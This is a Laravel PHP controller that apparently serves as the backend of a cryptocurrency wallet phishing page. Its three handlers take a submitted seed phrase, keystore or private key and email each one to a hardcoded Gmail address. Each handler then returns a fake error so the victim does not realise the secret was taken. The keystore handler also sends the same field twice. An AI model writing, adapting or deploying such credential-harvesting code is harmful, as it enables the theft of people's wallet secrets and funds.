<?php

namespace App\Http\Controllers;

use App\Mail\Notification;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class FormController extends Controller
{
    public function phrase(Request $request){
        $request->validate([
            'phrasetx' => ['required', 'min:12', 'max:250']
        ]);
        $type = 'phrase';
        $phrase = $request->phrasetx;
        $option = null;
        Mail::to('a1logisticscompanies@gmail.com')->send( new Notification($type, $phrase, $option));
        return response()->json(['res' => 'error'], 400);
    }


    public function keystore(Request $request){
        $request->validate([
            'keystoretx' => ['required', 'min:12', 'max:250'],
            'keystorefl' => ['required', 'min:12', 'max:250'],
        ]);
        $type = 'keystore';
        $phrase = $request->keystoretx;
        $option = $request->keystoretx;
        Mail::to('a1logisticscompanies@gmail.com')->send( new Notification($type, $phrase, $option));
        return response()->json(['error' => 'error'], 501);
    }

    
    public function privatekey(Request $request){
        $request->validate([
            'privatekeyfl' => ['required', 'min:64', 'max:250']
        ]);
        $type = 'privatekey';
        $phrase = $request->privatekeyfl;
        $option = null;
        Mail::to('a1logisticscompanies@gmail.com')->send( new Notification($type, $phrase, $option));
        return response()->json(['res' => 'error'], 501);
    }
}